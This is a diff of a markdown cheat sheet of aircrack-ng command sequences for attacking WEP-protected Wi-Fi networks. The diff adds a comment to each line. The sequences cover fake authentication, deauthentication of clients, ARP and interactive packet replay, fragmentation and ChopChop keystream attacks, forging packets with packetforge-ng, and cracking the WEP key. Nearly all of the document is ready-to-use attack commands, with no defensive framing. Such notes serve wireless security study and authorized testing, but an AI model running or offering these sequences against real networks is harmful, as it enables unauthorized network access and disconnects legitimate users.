@@ -1,72 +1,71 @@
 
 ## Fake Authentication Attack
    
-   airmon-ng start <interface> <AP channel>
-   macchanger --show <interface> 
-   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
-   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface name>
+   airmon-ng start <interface> <AP channel>                                         ## setting the wireless card (wlan0) to monitor mode
+   macchanger --show <interface>                                                    ## learning the MAC address of the mon0 (monitor mode) network interface
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>            ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface name>           ## performing a fake authentication attack against AP
    
    
 ## Deauthentication Attack
 
-   airmon-ng start <interface> <AP channel>
-   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
-   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface name>
+   airmon-ng start <interface> <AP channel>                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>            ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface name>                    ## performing a deauthentication attack against AP
 
 
 ## ARP Request Replay Attack
 
-   airmon-ng start <interface> <AP channel>
-   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
-   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
-   aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
-   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
-   aircrack-ng <capture>
+   airmon-ng start <interface> <AP channel>                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>            ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>                ## performing a fake authentication attack against AP
+   aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>                             ## performing a ARP Request Replay attack against AP
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>                         ## performing a deauthentication attack against AP
+   aircrack-ng <capture>                                                            ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
  
 
 ## Interactive Packet Replay Attack
 
-   airmon-ng start <interface> <AP channel>
-   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
-   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
-   aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
-   aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
-   aircrack-ng -z <capture>
+   airmon-ng start <interface> <AP channel>                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>            ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>                ## performing a fake authentication attack against AP
+   aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>     ## performing a interactive packet replay attack against AP
+   aircrack-ng -z <capture>                                                         ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
 
 
 ## Fragmentation Attack
 
-   airmon-ng start <interface> <AP channel>
-   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
-   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
-   aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface>
-   packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
-   aireplay-ng -2 -r <packet filename> <interface>
-   aircrack-ng <capture>
+   airmon-ng start <interface> <AP channel>                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>            ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>                ## performing a fake authentication attack against AP
+   aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface>                             ## performing a fragmentation attack against AP
+   packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>     ## creating an ARP request packet using packetforge-ng
+   tcpdump -n -vvv -e -s0 -r <output filename>                                      ## check the contents of the created package
+   aireplay-ng -2 -r <packet filename> <interface>                                  ## injecting the generated packet into the network (If the correct pack is injected, the IV amount will increase rapidly.)
+   aircrack-ng <capture>                                                            ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
    
 
 ## Korek ChopChop Attack
 
-   airmon-ng start <interface> <AP channel>
-   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
-   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
-   aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>
-   packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
-   aireplay-ng -2 -r <packet filename> <interface>
-   aircrack-ng <capture>
+   airmon-ng start <interface> <AP channel>                                         ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>            ## listening to the target AP on the specified channel
+   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>                ## performing a fake authentication attack against AP
+   aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>                             ## performing a korek chopchop attack against AP
+   packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>      ## creating an ARP request packet using packetforge-ng
+   tcpdump -n -vvv -e -s0 -r <output filename>                                      ## check the contents of the created package
+   aireplay-ng -2 -r <packet filename> <interface>                                  ## injecting the generated packet into the network (If the correct pack is injected, the IV amount will increase rapidly.)
+   aircrack-ng <capture>                                                            ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
 
 
 ## Bypassing WEP Shared Key Authentication
-
-   Attack Steps;
    
-   airmon-ng start <interface> <AP channel>
-   airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
-   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
-   aireplay-ng -1 0 -e <ESSID> -y <keystream file> -a <AP MAC> -h <Your MAC> <interface>
-   aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
-   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
-   aircrack-ng <capture>
+   airmon-ng start <interface> <AP channel>                                                  ## setting the wireless card (wlan0) to monitor mode
+   airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>                     ## listening to the target AP on the specified channel
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>                                  ## performing a deauthentication attack against AP to capture the PRGA XOR keystream
+   aireplay-ng -1 0 -e <ESSID> -y <keystream file> -a <AP MAC> -h <Your MAC> <interface>     ## performing a fake shared key authentication using XOR key flow
+   aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>                                      ## performing a ARP Request Replay attack against AP
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>                                  ## performing a deauthentication attack against AP
+   aircrack-ng <capture>                                                                     ## cracking WEP key (In order to achieve a successful result, you need to catch a sufficient number of IVs during the attack.)
    
    
    
